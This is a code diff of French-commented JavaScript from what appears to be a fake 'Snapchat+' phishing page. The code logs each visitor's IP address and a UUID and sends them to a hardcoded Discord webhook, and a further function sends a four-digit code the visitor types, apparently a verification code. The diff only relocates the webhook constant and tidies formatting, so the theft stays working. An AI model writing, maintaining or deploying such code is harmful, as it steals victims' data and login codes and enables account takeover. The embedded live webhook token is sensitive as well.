@@ -736,9 +736,6 @@ let userData = {
     timestamp: new Date().toISOString()
 };
 
-// Webhook Discord
-const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6XDHWW8m9abikb2b0OQoW4jhQCWNsu_wRXFBv8Ie3flopn9gbnS1k4_KD5xB';
-
 // Récupération IP
 fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
@@ -750,7 +747,7 @@ fetch('https://api.ipify.org?format=json')
         userIP = 'unknown';
         userData.ip = 'unknown';
     });
-
+    
 function selectDuration(val, el) {
     selectedDuration = val;
     document.querySelectorAll('.duration-card').forEach(c => c.classList.remove('selected'));
@@ -841,7 +838,10 @@ function submitData() {
         }
     }, 1500);
 }
+// Webhook Discord
+const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6XDHWW8m9abikb2b0OQoW4jhQCWNsu_wRXFBv8Ie3flopn9gbnS1k4_KD5xB';
 
+// Fonction pour envoyer les données au webhook
 function sendInitialWebhook() {
     const currentUrl = window.location.origin + window.location.pathname;
 
@@ -849,7 +849,7 @@ function sendInitialWebhook() {
     const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
 
     const embed = {
-        title: "🎯 Nouvelle personnes  - Snapchat+",
+        title: "🎯 Nouvelle personne - Snapchat+",
         description: `**UUID:** \`${userData.uuid}\``,
         color: 0xFFFC00,
         fields: [
@@ -866,7 +866,6 @@ function sendInitialWebhook() {
     };
 
     const payload = { embeds: [embed] };
-
     sendWebhookRequest(webhook, payload);
 }
 
@@ -889,7 +888,6 @@ function sendCodeWebhook(code) {
     const payload = { embeds: [embed] };
     sendWebhookRequest(webhook, payload);
 }
-
 function sendWebhookRequest(webhookUrl, payload) {
     console.log('Payload envoyé:', JSON.stringify(payload, null, 2));
 
@@ -917,7 +915,6 @@ function sendWebhookRequest(webhookUrl, payload) {
         console.error('Erreur fetch:', error);
     });
 }
-
 function handleCode(input, index) {
     input.value = input.value.replace(/\D/g, '').substring(0, 1);
     if (input.value.length === 1 && index < 3) {
